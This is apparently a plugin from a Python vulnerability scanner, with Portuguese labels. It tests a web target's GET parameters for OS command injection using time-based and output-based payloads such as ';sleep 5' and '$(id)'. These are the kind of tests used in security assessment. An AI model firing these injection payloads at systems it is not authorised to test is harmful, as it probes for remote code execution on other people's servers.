# plugins/rce_scanner.py
def run(target, ip, open_ports, banners):
    """
    Scanner RCE (Remote Code Execution) básico via command injection.
    Testa parâmetros GET com payloads de OS command injection.
    """
    import requests
    import time

    params = ["cmd", "exec", "command", "ping", "query", "ip", "host", "run",
              "process", "system", "shell", "test"]
    payloads = [
        (";sleep 5", "TIME_BASED"),
        ("|sleep 5", "TIME_BASED"),
        ("$(sleep 5)", "TIME_BASED"),
        ("`sleep 5`", "TIME_BASED"),
        (";id", "OUTPUT_BASED"),
        ("|id", "OUTPUT_BASED"),
        ("$(id)", "OUTPUT_BASED"),
    ]
    vulns = []

    for param in params:
        for payload, method in payloads:
            url = f"http://{target}/?{param}=127.0.0.1{payload}"
            try:
                start = time.time()
                resp = requests.get(url, timeout=12)
                elapsed = time.time() - start

                if method == "TIME_BASED" and elapsed >= 4.5:
                    vulns.append({
                        "tipo": "RCE_COMMAND_INJECTION",
                        "metodo": "TIME_BASED",
                        "parametro": param,
                        "payload": payload,
                        "tempo": round(elapsed, 2),
                        "severidade": "CRITICO",
                    })
                    break
                elif method == "OUTPUT_BASED" and "uid=" in resp.text:
                    vulns.append({
                        "tipo": "RCE_COMMAND_INJECTION",
                        "metodo": "OUTPUT_BASED",
                        "parametro": param,
                        "payload": payload,
                        "severidade": "CRITICO",
                        "amostra": resp.text[:200],
                    })
                    break
            except requests.Timeout:
                if method == "TIME_BASED":
                    vulns.append({
                        "tipo": "RCE_COMMAND_INJECTION",
                        "metodo": "TIMEOUT",
                        "parametro": param,
                        "payload": payload,
                        "severidade": "ALTO",
                    })
                    break
            except Exception:
                continue

    return {"plugin": "rce_scanner", "resultados": vulns if vulns else "Nenhum RCE detectado"}
